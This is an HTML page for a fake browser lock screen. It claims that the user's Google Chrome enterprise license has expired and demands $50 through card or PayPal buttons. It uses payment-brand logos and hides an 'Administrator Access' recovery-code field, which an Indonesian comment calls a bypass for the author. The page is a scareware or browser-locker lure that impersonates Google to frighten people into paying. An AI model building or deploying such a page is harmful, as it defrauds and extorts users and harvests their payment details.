<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Browser Access Locked</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    
    * { box-sizing: border-box; margin: 0; padding: 0; }
    
    body {
      font-family: 'Inter', system-ui, sans-serif;
      background-color: #0a0a0a;
      background-image: radial-gradient(circle at 50% 0%, #1f1f1f 0%, transparent 75%);
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      overflow: hidden;
    }

    .card {
      background: rgba(25, 25, 25, 0.7);
      backdrop-filter: blur(20px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      padding: 2.5rem 2rem;
      border-radius: 1.2rem;
      width: 90%;
      max-width: 400px;
      text-align: center;
      box-shadow: 0 30px 60px rgba(0,0,0,0.8);
    }

    h1 { font-size: 1.4rem; font-weight: 700; margin-bottom: 0.5rem; letter-spacing: -0.5px; }
    p { color: #9ca3af; font-size: 0.85rem; margin-bottom: 1.5rem; line-height: 1.5; }
    
    .price-box { background-color: #000; border: 1px solid #333; border-radius: 0.75rem; padding: 1rem; margin-bottom: 1.5rem; }
    .price-amount { font-size: 2.5rem; font-weight: 700; color: #fff; }
    
    .payment-methods {
      display: flex; justify-content: center; gap: 10px; margin-bottom: 1.5rem;
      background: #fff; padding: 10px; border-radius: 8px;
    }
    .payment-methods img { height: 25px; object-fit: contain; }

    button {
      width: 100%; padding: 0.85rem; border-radius: 0.5rem; font-weight: 600;
      font-size: 0.95rem; cursor: pointer; border: none; margin-bottom: 0.75rem; transition: 0.2s;
      display: flex; justify-content: center; align-items: center;
    }
    .btn-primary { background-color: white; color: black; }
    .btn-primary:hover { background-color: #e5e7eb; }
    .btn-paypal { background-color: #ffc439; color: #003087; }
    .btn-paypal:hover { background-color: #f4bb33; }
    
    /* Area Recovery Code */
    .recovery-area { margin-top: 2rem; border-top: 1px solid #333; padding-top: 1.5rem; }
    .recovery-label { font-size: 0.75rem; color: #666; margin-bottom: 0.5rem; display: block; }
    
    .recovery-input-group { display: flex; gap: 8px; }
    input[type="password"] {
      flex: 1; padding: 0.75rem; border-radius: 0.5rem; border: 1px solid #333;
      background: #111; color: white; outline: none; font-family: inherit;
    }
    input[type="password"]:focus { border-color: #555; }
    
    .btn-unlock {
      background: #333; color: white; padding: 0 1rem; border-radius: 0.5rem;
      font-weight: 500; cursor: pointer; border: none; width: auto; margin-bottom: 0;
    }
    .btn-unlock:hover { background: #444; }

    .spinner { animation: spin 1s linear infinite; height: 1rem; width: 1rem; margin-right: 0.5rem; }
    @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
  </style>
</head>
<body>
  
  <div class="card">
    <h1>Workspace Locked</h1>
    <p>Your Google Chrome enterprise license has expired. Please complete your payment to continue browsing.</p>
    
    <div class="price-box">
      <div class="price-amount">$50.00</div>
    </div>

    <!-- Logo Asli -->
    <div class="payment-methods">
      <img src="https://upload.wikimedia.org/wikipedia/commons/d/d3/Visa_Inc._logo_%282005%E2%80%932014%29.png?utm_source=id.wikipedia.org&utm_campaign=index&utm_content=original" alt="Visa">
      <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
      <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="PayPal">
    </div>

    <button id="btn-card" class="btn-primary">
      <span>Pay with Credit Card</span>
    </button>
    
    <button id="btn-paypal" class="btn-paypal">
      <span>Pay with PayPal</span>
    </button>

    <!-- Fitur Bypass untuk Ibra -->
    <div class="recovery-area">
      <span class="recovery-label">Administrator Access</span>
      <div class="recovery-input-group">
        <input type="password" id="recovery-code" placeholder="Enter Recovery Code">
        <button id="btn-unlock" class="btn-unlock">Unlock</button>
      </div>
    </div>
  </div>

  <script src="paywall.js"></script>
</body>
</html>
